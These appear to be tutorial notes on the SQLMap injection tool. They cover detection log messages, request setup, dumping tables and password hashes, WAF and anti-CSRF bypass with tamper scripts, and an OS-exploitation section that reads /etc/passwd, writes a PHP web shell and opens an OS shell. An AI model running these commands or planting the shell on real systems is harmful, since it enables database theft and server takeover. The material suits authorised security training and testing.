

##       SQL injection techniques to use (default "BEUSTQ")

The technique characters BEUSTQ refers to the following:

-    B: Boolean-based blind
-    E: Error-based
-    U: Union query-based
-    S: Stacked queries
-    T: Time-based blind
-    Q: Inline queries


        Note:  option '-u' is used to provide the target URL, while the switch '--batch' is used for skipping any required user-input, by automatically choosing using the default option.



        ///Log Messages Description


        -URL content is stable

        Log Message:

            "target URL content is stable"


        This means that there are no major changes between responses in case of continuous identical requests. This is important from the automation point of view since, in the event of stable responses, it is easier to spot differences caused by the potential SQLi attempts. 

        
        -Parameter appears to be dynamic

        Log Message:

            "GET parameter 'id' appears to be dynamic"

        
        It is always desired for the tested parameter to be "dynamic," as it is a sign that any changes made to its value would result in a change in the response; hence the parameter may be linked to a database. 


        -Parameter might be injectable

        Log Message: "heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"

        As discussed before, DBMS errors are a good indication of the potential SQLi. In this case, there was a MySQL error when SQLMap sends an intentionally invalid value was used (e.g. ?id=1",)..).))'), which indicates that the tested parameter could be SQLi injectable and that the target could be MySQLIt should be noted that this is not proof of SQLi, but just an indication that the detection mechanism has to be proven in the subsequent run.


        -Parameter might be vulnerable to XSS attacks

        Log Message:

         "heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"



        -Back-end DBMS is '...'

        Log Message:

        "it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]"




        -Level/risk values

        Log Message:

            "for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]"



        -Reflective values found

        Log Message:

         "reflective value(s) found and filtering out"


        Just a warning that parts of the used payloads are found in the response. This behavior could cause problems to automation tools, as it represents the junk. However, SQLMap has filtering mechanisms to remove such junk before comparing the original page content.


        -Parameter appears to be injectable

        Log Message:

        "GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")"

        This message indicates that the parameter appears to be injectable, though there is still a chance for it to be a false-positive finding. In the case of boolean-based blind and similar SQLi types (e.g., time-based blind), where there is a high chance of false-positives,



        -Time-based comparison statistical model

        Log Message:

        "time-based comparison requires a larger statistical model, please wait........... (done)"


        -Extending UNION query injection technique tests

        Log Message:

        "automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found


             

        UNION-query SQLi checks require considerably more requests for successful recognition of usable payload than other SQLi types. To lower the testing time per parameter, especially if the target does not appear to be injectable, the number of requests is capped to a constant value (i.e., 10) for this type of check. However, if there is a good chance that the target is vulnerable, especially as one other (potential) SQLi technique is found, SQLMap extends the default number of requests for UNION query SQLi, because of a higher expectancy of success.


        -Technique appears to be usable

        Log Message:

    "ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"

        As a heuristic check for the UNION-query SQLi type, before the actual UNION payloads are sent, a technique known as ORDER BY is checked for usability. In case that it is usable, SQLMap can quickly recognize the correct number of required UNION columns by conducting the binary-search approach.


        -Parameter is vulnerable

        Log Message:

    "GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]"



        --Sqlmap identified injection points

        Log Message:

    "sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"


        Following after is a listing of all injection points with type, title, and payloads, which represents the final proof of successful detection and exploitation of found SQLi vulnerabilities. It should be noted that SQLMap lists only those findings which are provably exploitable (i.e., usable).


        -Data logged to text files

        Log Message:

    "fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"



        
                    //Running SQLMap on an HTTP Request



        -Curl Commands

        One of the best and easiest ways to properly set up an SQLMap request against the specific target (i.e., web request with parameters inside) is by utilizing Copy as cURL feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools

        By pasting the clipboard content (Ctrl-V) into the command line, and changing the original command curl to sqlmap, we are able to use SQLMap with the identical curl command:



        
        -GET/POST Requests

        GET parameters are provided with the usage of option -u/--url, as in the previous example. As for testing POST data, the --data flag can be used, as follows:

        $ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'


        In such cases, POST parameters uid and name will be tested for SQLi vulnerability. For example, if we have a clear indication that the parameter uid is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter using -p uid. 

        Otherwise, we could mark it inside the provided data with the usage of special marker * as follows:

        $ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'




        -Full HTTP Requests

        If we need to specify a complex HTTP request with lots of different header values and an elongated POST body, we can use the -r flag. With this option, SQLMap is provided with the "request file," containing the whole HTTP request inside a single textual file. In a common scenario, such HTTP request can be captured from within a specialized proxy application (e.g. Burp) and written into the request file, as follows:

        An example of an HTTP request captured with Burp would look like:

        GET /?id=1 HTTP/1.1
        Host: www.example.com
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1
        DNT: 1
        If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
        If-None-Match: "3147526947"
        Cache-Control: max-age=0




        We can either manually copy the HTTP request from within Burp and write it to a file, or we can right-click the request within Burp and choose Copy to file. Another way of capturing the full HTTP request would be through using the browser, as mentioned earlier in the section, and choosing the option Copy > Copy Request Headers, and then pasting the request into a file.


        $ sqlmap -r req.txt


        Tip: similarly to the case with the '--data' option, within the saved request file, we can specify the parameter we want to inject in with an asterisk (*), such as '/?id=*'.




        -Custom SQLMap Requests


        to specify the (session) cookie value to PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c option --cookie would be used as follows:

        $ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

        The same effect can be done with the usage of option -H/--header:

        $ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

        We can apply the same to options like --host, --referer, and -A/--user-agent, which are used to specify the same HTTP headers' values.

        there is a switch --random-agent designed to randomly select a User-agent header value

        the --mobile switch can be used to imitate the smartphone by using that same header value.

         

         ---Target HTTP Headers for injection

         While SQLMap, by default, targets only the HTTP parameters, it is possible to test the headers for the SQLi vulnerability. The easiest way is to specify the "custom" injection mark after the header's value (e.g. --cookie="id=1*"). The same principle applies to any other part of the request.


         --Change HTTP method

         $ sqlmap -u www.target.com --data='id=1' --method PUT



         --Custom Post requests


         Apart from the most common form-data POST body style (e.g. id=1), SQLMap also supports JSON formatted (e.g. {"id":1}) and XML formatted (e.g. <element><id>1</id></element>) HTTP requests.

        Support for these formats is implemented in a "relaxed" manner; thus, there are no strict constraints on how the parameter values are stored inside. In case the POST body is relatively simple and short, the option --data will suffice.

        However, in the case of a complex or long POST body, we can once again use the -r option:


        HTTP / HTTP/1.0
        Host: www.example.com

        {
        "data": [{
            "type": "articles",
            "id": "1",
            "attributes": {
            "title": "Example JSON",
            "body": "Just an example",
            "created": "2020-05-22T14:56:29.000Z",
            "updated": "2020-05-22T14:56:28.000Z"
            },
            "relationships": {
            "author": {
                "data": {"id": "42", "type": "user"}
            }
            }
        }]
        }






                    ////Handling SQLMap Errors

        

        --Display Errors

        switch the --parse-errors, to parse the DBMS errors (if any) and displays them as part of the programrun



        --Store the Traffic

        The -t option stores the whole traffic content to an output file:

        $ sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt


        
        --verbose output

         the -v option, which raises the verbosity level of the console output

         $ sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch



         --Using Proxy



         we can utilize the --proxy option to redirect the whole traffic through a (MiTM) proxy (e.g., Burp).





                //Attack Tuning

        
        Every payload sent to the target consists of:

        vector (e.g., UNION ALL SELECT 1,2,VERSION()): central part of the payload, carrying the useful SQL code to be executed at the target.

        boundaries (e.g. '<vector>-- -): prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement.


        -Prefix/Suffix

        There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run.
        For such runs, options --prefix and --suffix can be used as follows:

        $ sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"


        This will result in an enclosure of all vector values between the static prefix %')) and the suffix -- -.



        -Level/Risk

        By default, SQLMap combines a predefined set of most common boundaries (i.e., prefix/suffix pairs), along with the vectors having a high chance of success in case of a vulnerable target. Nevertheless, there is a possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap.

        -The option --level (1-5, default 1) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).

        -The option --risk (1-3, default 1) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).


        The best way to check for differences between used boundaries and payloads for different values of --level and --risk, is the usage of -v option to set the verbosity level. In verbosity 3 or higher (e.g. -v 3), messages containing the used [PAYLOAD] will be displayed.

        by default (i.e. --level=1 --risk=1), the number of payloads used for testing a single parameter goes up to 72, while in the most detailed case (--level=5 --risk=3) the number of payloads increases to 7,865



        -Advanced Tuning

        -Status Codes

        If the difference between TRUE and FALSE responses can be seen in the HTTP codes (e.g. 200 for TRUE and 500 for FALSE), the option --code could be used to fixate the detection of TRUE responses to a specific HTTP code (e.g. --code=200).

        
        -Titles

        If the difference between responses can be seen by inspecting the HTTP page titles, the switch --titles could be used to instruct the detection mechanism to base the comparison based on the content of the HTML tag <title>.


        -Strings

        In case of a specific string value appearing in TRUE responses (e.g. success), while absent in FALSE responses, the option --string could be used to fixate the detection based only on the appearance of that single value (e.g. --string=success).

        
        -Text-only

        When dealing with a lot of hidden content, such as certain HTML page behaviors tags (e.g. <script>, <style>, <meta>, etc.), we can use the --text-only switch, which removes all the HTML tags, and bases the comparison only on the textual (i.e., visible) content.


        -Techniques

        In some special cases, we have to narrow down the used payloads only to a certain type. For example, if the time-based blind payloads are causing trouble in the form of response timeouts, or if we want to force the usage of a specific SQLi payload type, the option --technique can specify the SQLi technique to be used.

        For example, if we want to skip the time-based blind and stacking SQLi payloads and only test for the boolean-based blind, error-based, and UNION-query payloads, we can specify these techniques with --technique=BEU.


        -UNION SQLi Tuning


        In some cases, UNION SQLi payloads require extra user-provided information to work. If we can manually find the exact number of columns of the vulnerable SQL query, we can provide this number to SQLMap with the option --union-cols (e.g. --union-cols=17). In case that the default "dummy" filling values used by SQLMap -NULL and random integer- are not compatible with values from results of the vulnerable SQL query, we can specify an alternative value instead (e.g. --union-char='a').Furthermore, in case there is a requirement to use an appendix at the end of a UNION query in the form of the FROM <table> (e.g., in case of Oracle), we can set it with the option --union-from (e.g. --union-from=users).





                    ///Database Enumeration

        
        -SQLMap Data Exfiltration


        SQLMap has a predefined set of queries for all supported DBMSes, where each entry represents the SQL that must be run at the target to retrieve the desired content. For example, the excerpts from queries.xml for a MySQL DBMS 



        -Basic DB Data Enumeration

        Usually, after a successful detection of an SQLi vulnerability, we can begin the enumeration of basic details from the database, such as the hostname of the vulnerable target (--hostname), current user's name (--current-user), current database name (--current-db), or password hashes (--passwords). SQLMap will skip SQLi detection if it has been identified earlier and directly start the DBMS enumeration process.


        Enumeration usually starts with the retrieval of the basic information:

    Database version banner (switch --banner)
    Current user name (switch --current-user)
    Current database name (switch --current-db)
    Checking if the current user has DBA (administrator) rights. (--is-dba)


        Note: The 'root' user in the database context in the vast majority of cases does not have any relation with the OS user "root", other than that representing the privileged user within the DBMS context. This basically means that the DB user should not have any constraints within the database context, while OS privileges (e.g. file system writing to arbitrary location) should be minimalistic, at least in the recent deployments. The same principle applies for the generic 'DBA' role.




        --Table Enumeration


        $ sqlmap -u "http://www.example.com/?id=1" --tables -D {database}

        
        After spotting the table name of interest, retrieval of its content can be done by using the --dump option and specifying the table name with -T users


        $ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb


        Tip: Apart from default CSV, we can specify the output format with the option `--dump-format` to HTML or SQLite, so that we can later further investigate the DB in an SQLite environment.


        --Table/Row Enumeration

        When dealing with large tables with many columns and/or rows, we can specify the columns (e.g., only name and surname columns) with the -C option, as follows:

        $ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname


        To narrow down the rows based on their ordinal number(s) inside the table, we can specify the rows with the --start and --stop options (e.g., start from 2nd up to 3rd entry), as follows:

        $ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3



        -Conditional Enumeration


        If there is a requirement to retrieve certain rows based on a known WHERE condition (e.g. name LIKE 'f%'), we can use the option --where, as follows:

        $ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"


        -Full DB Enumeration

        the --dump-all switch, all the content from all the databases will be retrieved.


        By simply using the switch --dump without specifying a table with -T, all of the current database content will be retrieved. 




        --DB Schema Enumeration

        
        If we wanted to retrieve the structure of all of the tables so that we can have a complete overview of the database architecture, we could use the switch --schema:

        $ sqlmap -u "http://www.example.com/?id=1" --schema


        --Searching for Data

        When dealing with complex database structures with numerous tables and columns, we can search for databases, tables, and columns of interest, by using the --search option. This option enables us to search for identifier names by using the LIKE operator. For example, if we are looking for all of the table names containing the keyword user, we can run SQLMap as follows:

        $ sqlmap -u "http://www.example.com/?id=1" --search -T user


        In the above example, we can immediately spot a couple of interesting data retrieval targets based on these search results. We could also have tried to search for all column names based on a specific keyword (e.g. pass):

        $ sqlmap -u "http://www.example.com/?id=1" --search -C pass



        --DB Users Password Enumeration and Cracking


        Apart from user credentials found in DB tables, we can also attempt to dump the content of system tables containing database-specific credentials (e.g., connection credentials). To ease the whole process, SQLMap has a special switch --passwords designed especially for such a task:

        $ sqlmap -u "http://www.example.com/?id=1" --passwords --batch



        Tip: The '--all' switch in combination with the '--batch' switch, will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.




                //Bypassing Web Application Protections

        
        -Anti-CSRF Token Bypass

        In most basic terms, each HTTP request in such a scenario should have a (valid) token value available only if the user actually visited and used the page. While the original idea was the prevention of scenarios with malicious links, where just opening these links would have undesired consequences for unaware logged-in users (e.g., open administrator pages and add a new user with predefined credentials), this security feature also inadvertently hardened the applications against the (unwanted) automation.


        Nevertheless, SQLMap has options that can help in bypassing anti-CSRF protection. Namely, the most important option is --csrf-token. By specifying the token parameter name (which should already be available within the provided request data), SQLMap will automatically attempt to parse the target response content and search for fresh token values so it can use them in the next request.

        Additionally, even in a case where the user does not explicitly specify the token's name via --csrf-token, if one of the provided parameters contains any of the common infixes (i.e. csrf, xsrf, token), the user will be prompted whether to update it in further requests



        -Unique Value Bypass

        In some cases, the web application may only require unique values to be provided inside predefined parameters. Such a mechanism is similar to the anti-CSRF technique described above, except that there is no need to parse the web page content. So, by simply ensuring that each request has a unique value for a predefined parameter, the web application can easily prevent CSRF attempts while at the same time averting some of the automation tools. For this, the option --randomize should be used, pointing to the parameter name containing a value which should be randomized before being sent:

        $ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI


        -Calculated Parameter Bypass

        Another similar mechanism is where a web application expects a proper parameter value to be calculated based on some other parameter value(s). Most often, one parameter value has to contain the message digest (e.g. h=MD5(id)) of another one. To bypass this, the option --eval should be used, where a valid Python code is being evaluated just before the request is being sent to the target:

        $ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI


        -IP Address Concealing

        In case we want to conceal our IP address, or if a certain web application has a protection mechanism that blacklists our current IP address, we can try to use a proxy or the anonymity network Tor. A proxy can be set with the option --proxy (e.g. --proxy="socks4://177.39.187.70:33283"), where we should add a working proxy.


        In addition to that, if we have a list of proxies, we can provide them to SQLMap with the option --proxy-file. This way, SQLMap will go sequentially through the list, and in case of any problems (e.g., blacklisting of IP address), it will just skip from current to the next from the list. The other option is Tor network use to provide an easy to use anonymization, where our IP can appear anywhere from a large list of Tor exit nodes. When properly installed on the local machine, there should be a SOCKS4 proxy service at the local port 9050 or 9150. By using switch --tor, SQLMap will automatically try to find the local port and use it appropriately.

        If we wanted to be sure that Tor is properly being used, to prevent unwanted behavior, we could use the switch --check-tor. In such cases, SQLMap will connect to the https://check.torproject.org/ and check the response for the intended result (i.e., Congratulations appears inside).



        -WAF Bypass


        Whenever we run SQLMap, As part of the initial tests, SQLMap sends a predefined malicious looking payload using a non-existent parameter name (e.g. ?pfov=...) to test for the existence of a WAF (Web Application Firewall). There will be a substantial change in the response compared to the original in case of any protection between the user and the target. For example, if one of the most popular WAF solutions (ModSecurity) is implemented, there should be a 406 - Not Acceptable response after such a request.

        In case of a positive detection, to identify the actual protection mechanism, SQLMap uses a third-party library identYwaf, containing the signatures of 80 different WAF solutions. If we wanted to skip this heuristical test altogether (i.e., to produce less noise), we can use switch --skip-waf.



        -User-agent Blacklisting Bypass


        In case of immediate problems (e.g., HTTP error code 5XX from the start) while running SQLMap, one of the first things we should think of is the potential blacklisting of the default user-agent used by SQLMap (e.g. User-agent: sqlmap/1.4.9 (http://sqlmap.org)).

        This is trivial to bypass with the switch --random-agent, which changes the default user-agent with a randomly chosen value from a large pool of values used by browsers.


        -Tamper Scripts

        Finally, one of the most popular mechanisms implemented in SQLMap for bypassing WAF/IPS solutions is the so-called "tamper" scripts. Tamper scripts are a special kind of (Python) scripts written for modifying requests just before being sent to the target, in most cases to bypass some protection.

        Tamper scripts can be chained, one after another, within the --tamper option (e.g. --tamper=between,randomcase), where they are run based on their predefined priority.A priority is predefined to prevent any unwanted behavior, as some scripts modify payloads by modifying their SQL syntax (e.g. ifnull2ifisnull). In contrast, some tamper scripts do not care about the inner content (e.g. appendnullbyte).


        Tamper scripts can modify any part of the request, although the majority change the payload content. The most notable tamper scripts are the following:

        Tamper-Script               	Description

0eunion 	                Replaces instances of UNION with e0UNION

base64encode 	            Base64-encodes all characters in a given payload

between 	                Replaces greater than operator (>) with NOT BETWEEN 0 AND # and equals operator (=) with BETWEEN # AND #

commalesslimit 	            Replaces (MySQL) instances like LIMIT M, N with LIMIT N OFFSET M counterpart

equaltolike 	            Replaces all occurrences of operator equal (=) with LIKE counterpart

halfversionedmorekeywords 	Adds (MySQL) versioned comment before each keyword

modsecurityversioned 	    Embraces complete query with (MySQL) versioned comment

modsecurityzeroversioned 	Embraces complete query with (MySQL) zero-versioned comment

percentage 	                Adds a percentage sign (%) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)

plus2concat 	            Replaces plus operator (+) with (MsSQL) function CONCAT() counterpart

randomcase 	                Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)

space2comment 	            Replaces space character ( ) with comments `/

space2dash 	                Replaces space character ( ) with a dash comment (--) followed by a random string and a new line (\n)

space2hash 	                Replaces (MySQL) instances of space character ( ) with a pound character (#) followed by a random string and a new line (\n)

space2mssqlblank 	        Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters

space2plus 	                Replaces space character ( ) with plus (+)

space2randomblank 	        Replaces space character ( ) with a random blank character from a valid set of alternate characters

symboliclogical 	        Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)

versionedkeywords 	        Encloses each non-function keyword with (MySQL) versioned comment

versionedmorekeywords 	    Encloses each keyword with (MySQL) versioned comment




To get a whole list of implemented tamper scripts, along with the description as above, switch --list-tampers can be used.




        -Miscellaneous Bypasses

        
        Out of other protection bypass mechanisms, there are also two more that should be mentioned. The first one is the Chunked transfer encoding, turned on using the switch --chunked, which splits the POST request's body into so-called "chunks." Blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.



        The other bypass mechanisms is the HTTP parameter pollution (HPP), where payloads are split in a similar way as in case of --chunked between different same parameter named values (e.g. ?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...), which are concatenated by the target platform if supporting it (e.g. ASP).





                //OS Exploitation


        
        SQLMap has the ability to utilize an SQL Injection to read and write files from the local system outside the DBMS. 


        -File Read/Write

         in MySql, to read local files, the DB user must have the privilege to LOAD DATA and INSERT, to be able to load the content of a file to a table and then reading that table.

        An example of such a command is:

            LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;

        While we do not necessarily need to have database administrator privileges (DBA) to read data, this is becoming more common in modern DBMSes. The same applies to other common databases. Still, if we do have DBA privileges, then it is much more probable that we have file-read privileges.



        -Checking for DBA Privileges

        $ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba



        -Reading Local Files

        $ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"


        $ cat ~/.sqlmap/output/www.example.com/files/_etc_passwd



        -Writing Local Files

        When it comes it writing files to the hosting server, it becomes much more restricted in modern DMBSes, since we can utilize this to write a Web Shell on the remote server, and hence get code execution and take over the server.

        This is why modern DBMSes disable file-write by default and need certain privileges for DBA's to be able to write files. For example, in MySql, the --secure-file-priv configuration must be manually disabled to allow writing data into local files using the INTO OUTFILE SQL query, in addition to any local access needed on the host server, like the privilege to write in the directory we need.

        Still, many web applications require the ability for DBMSes to write data into files, so it is worth testing whether we can write files to the remote server. To do that with SQLMap, we can use the --file-write and --file-dest options. First, let's prepare a basic PHP web shell and write it into a shell.php file:


        $ echo '<?php system($_GET["cmd"]); ?>' > shell.php


        $ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"




        -OS Command Execution



        SQLMap utilizes various techniques to get a remote shell through SQL injection vulnerabilities, like writing a remote shell, as we just did, writing SQL functions that execute commands and retrieve output or even using some SQL queries that directly execute OS command, like xp_cmdshell in Microsoft SQL Server.


        $ sqlmap -u "http://www.example.com/?id=1" --os-shell

        